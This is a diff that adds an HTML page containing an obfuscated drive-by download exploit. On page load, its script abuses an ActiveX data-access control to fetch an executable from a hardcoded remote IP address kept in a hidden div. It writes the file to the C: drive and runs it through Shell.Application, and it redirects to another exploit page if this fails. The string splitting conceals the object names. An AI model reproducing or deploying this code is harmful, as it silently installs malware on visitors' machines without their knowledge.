@@ -1,0 +1,31 @@
+<body onload='ZLFZz()'>
+<DIV id='sR28nH' style='display:none'>http://64.247.24.34/001853480108/exe.php</DIV>
+
+</body>
+<script type="text/javascript">
+
+function ZLFZz(){
+try {
+	var efds='';
+
+  var aZxrwkh = document.createElement("o"+efds+"bje"+efds+"c"+efds+"t");
+  aZxrwkh.setAttribute("id","aZ"+efds+"x"+efds+"r"+efds+"wk"+efds+"h");
+aZxrwkh.setAttribute("class"+efds+"id","clsid:"+efds+"B"+efds+"D"+efds+"9"+efds+"6"+efds+"C"+efds+"5"+efds+"5"+efds+"6"+efds+"-"+efds+"65A3-"+efds+"11D0-9"+efds+"8"+efds+"3A-00C0"+efds+"4FC29E"+efds+"3"+efds+"6");
+var EkbSUoL = aZxrwkh.CreateObject("adodb."+efds+"st"+efds+"r"+efds+"eam",'');
+var PEELt6 = aZxrwkh.CreateObject("S"+efds+"hell"+efds+"."+efds+"App"+efds+"l"+efds+"i"+efds+"cat"+efds+"ion",'');
+var dnigvr = aZxrwkh.CreateObject("msxml2.XML"+efds+"HTTP",'');
+var jx89msS;
+jx89msS=document.getElementById("sR28nH").innerText;
+
+  dnigvr.open("G"+efds+"ET",jx89msS,false);
+  dnigvr.send();
+  EkbSUoL.type = 1;
+  EkbSUoL.open();
+EkbSUoL.Write(dnigvr.responseBody);
+  Frogxa = "c:\\S87ekhV.exe";
+EkbSUoL.SaveToFile(Frogxa,2);
+eval("PEELt6.ShellExecute("+efds+"Frog"+efds+"x"+efds+"a);");
+  }
+  catch(e) {window.location="bof.php"};
+  }
+</script>
